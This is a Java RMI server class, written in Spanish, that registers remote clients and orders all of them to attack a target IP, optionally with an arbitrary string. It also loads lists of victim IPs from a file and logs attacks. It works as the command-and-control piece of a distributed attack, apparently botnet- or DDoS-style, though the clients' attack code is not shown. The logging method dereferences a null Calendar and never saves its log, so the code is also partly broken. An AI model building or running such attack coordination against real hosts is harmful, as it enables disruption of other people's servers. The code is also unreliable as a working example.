import java.rmi.RemoteException;
import java.rmi.server.ServerNotActiveException;
import java.rmi.server.UnicastRemoteObject;
import java.sql.Time;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.Callable;

public class RMIServerIMPL extends UnicastRemoteObject implements RMIServerI {

	
	public ArrayList<RMIClienteI> clientes ;
	public RMIServerIMPL() throws RemoteException{
		super();
		clientes = new ArrayList<RMIClienteI>();
		
		// TODO Auto-generated constructor stub
	}

	@Override
	public synchronized void registrarCliente(RMIClienteI cli) {
		// TODO Auto-generated method stub
		clientes.add(cli);
		}

	public  void atacar (String ip) throws RemoteException
	{
		 for (int i = 0 ; i < clientes.size(); i++)
		 {
			 RMIClienteI x = (RMIClienteI) clientes.get(i);
			 x.Attack(ip);
		 }
	}
	
	public  void atacarStrArb (String ip, String mensaje) throws RemoteException
	{
		 for (int i = 0 ; i < clientes.size(); i++)
		 {
			 RMIClienteI x = (RMIClienteI) clientes.get(i);
			 x.AttackString(ip, mensaje);
		 }
	}
	
	public void importFile(String path)
	{
		ArrayList<String> ips = AccesoDatosArchivo.tomarIPS(path);
		Victima v = new Victima();
		for(String x : ips)
		{
			v.setPath(path);
			v.setIpServidor(x);
			v.setAtaqueRealizado(false);
			v.agregar();
		}

	}

	@Override
	public void registrarLog(String ipVictima,
			String tipoAtaque, String strArbitrario) throws RemoteException {
		Log log = new Log();
		Calendar cal = null ;
		cal.getInstance();
		log.setFecha(new Date(cal.get(Calendar.YEAR),cal.get(Calendar.MONTH),cal.get(Calendar.DATE)));
		log.setHora(new Time(cal.get(Calendar.HOUR), cal.get(Calendar.MINUTE),cal.get(Calendar.SECOND)));
		log.setIpServidor(ipVictima);
		log.setKeyword(tipoAtaque);
		if(strArbitrario== null) log.setDescripcion("Ataque Coneccion desde");
		else log.setDescripcion("Ataque String");
	}
}
